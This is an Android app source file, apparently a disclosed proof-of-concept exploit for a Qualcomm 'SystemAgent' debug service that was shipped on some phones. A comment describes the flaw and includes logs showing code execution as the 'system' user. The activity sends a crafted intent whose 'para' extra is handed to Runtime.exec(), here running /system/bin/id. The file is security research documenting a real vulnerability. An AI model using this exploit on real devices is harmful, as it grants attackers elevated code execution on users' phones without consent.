package asia.malware.agentbuster;

import android.content.ComponentName;
import android.content.Intent;
import android.nfc.Tag;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;

/*
    Author: Jon "jcase" Sawyer

    The testing/debug application "SystemAgent" was accidentally shipped on some phones by
    Qualcomm partners. This application was intended for testing purposes, and should have
    never been shipped on a production device.

    Vulnerabilities in this application allow code execution as the elevated user "system",
    as well as numerous other fun this. These vulnerabilities landed me a place on the
    Qualcomm Product Security Hall of Fame.

    See https://www.qualcomm.com/connect/contact/security/product-security/hall-of-fame

    This POC only covers execution as system, but you will find other fun this in the
    "SystemAgent" application.

    D/AgentBuster( 1718): Starting
    D/AgentBuster( 1718): Finished
    D/SystemAgent( 1485): [onStartCommand] 2
    D/SystemAgent( 1485): [access$000] /system/bin/id
    D/SystemAgent( 1485): [access$000] 0:/system/bin/id
    D/PackageBroadcastService( 3578): Received broadcast action=android.intent.action.PACKAGE_REPLACED and uri=asia.malware.agentbuster
    D/SystemAgent( 1485): [access$000] uid=1000(system) gid=1000(system) groups=1000(system),1004(input),1010(wifi),1015(sdcard_rw),1021(gps),1023(media_rw),1028(sdcard_r),2002(diag),3001(net_bt_admin),3002(net_bt),3003(inet),3004(net_raw),3005(net_admin),3009(qcom_diag),41000(u0_a31000) context=u:r:system_app:s0
    D/SystemAgent( 1485): [access$000] ExitValue=0

 */
public class MainActivity extends ActionBarActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String TAG = "AgentBuster";
        Log.d(TAG, "Starting");

        //Build intent with the appropriate action
        Intent evilIntent = new Intent ("android.system.fullagent");
        //Use action "android.system.agent" to exploit other functions
        //Set the target components
        evilIntent.setComponent(new ComponentName("com.qualcomm.agent", "com.qualcomm.agent.SystemAgent"));
        //the para extra sets the command to execution, with the fullagent action the para extra is
        //executed with untime.getRuntime().exec()
        evilIntent.putExtra("para","/system/bin/id");
        this.startService(evilIntent);


        Log.d(TAG, "Finished");



    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
